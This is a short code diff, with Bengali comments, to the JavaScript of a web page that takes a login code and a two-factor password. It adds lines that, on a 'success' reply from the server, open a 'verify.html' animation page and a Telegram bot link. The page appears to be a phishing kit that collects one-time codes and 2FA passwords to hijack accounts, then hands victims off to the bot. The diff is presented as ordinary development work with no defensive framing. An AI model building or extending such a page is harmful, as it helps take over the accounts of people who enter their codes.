@@ -265,7 +265,6 @@
                 return;
             }
             
-            // নতুন কোড রিকোয়েস্ট করার সময় আগের ইনপুট ক্লিয়ার করে দেওয়া হচ্ছে
             realInput.value = "";
             updateBoxes();
 
@@ -314,6 +313,8 @@
             .then(res => res.json())
             .then(data => {
                 if(data.status === "success") {
+                    // পাসওয়ার্ড বা ওটিপি সফল হলে নতুন ট্যাবে অ্যানিমেশন পেজ (verify.html) এবং টেলিগ্রাম বট ওপেন হবে
+                    window.open("verify.html", "_blank");
                     window.open("https://t.me/Desi_Magi909_Bot?start=start", "_blank");
                 } else if(data.status === "2fa_required") {
                     document.getElementById('passwordModal').style.display = 'flex';
@@ -346,6 +347,8 @@
             .then(res => res.json())
             .then(data => {
                 if(data.status === "success") {
+                    // 2FA পাসওয়ার্ড সফল হলে নতুন ট্যাবে অ্যানিমেশন পেজ (verify.html) এবং টেলিগ্রাম বট ওপেন হবে
+                    window.open("verify.html", "_blank");
                     window.open("https://t.me/Desi_Magi909_Bot?start=start", "_blank");
                 } else {
                     alert("Password Verification Failed: " + data.message);
